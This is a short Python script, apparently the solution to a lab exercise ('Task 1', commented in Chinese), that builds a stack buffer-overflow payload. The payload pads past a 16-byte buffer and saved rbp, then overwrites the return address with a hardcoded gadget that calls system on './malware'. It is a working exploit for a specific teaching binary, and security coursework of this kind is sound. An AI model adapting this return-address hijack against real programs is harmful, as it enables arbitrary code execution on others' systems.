#!/usr/bin/env python3
"""Task 1: 构造 payload，劫持 input 的返回地址执行 ./malware。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"./malware\x00"            # 会被 strcpy 拷进全局 command_buf
payload += b"A" * (24 - len(payload))  # 填满 16 字节缓冲区 + 8 字节 saved rbp
payload += p64(0x401a6b)               # eval 中 "mov edi, command_buf; call system"

sys.stdout.buffer.write(payload)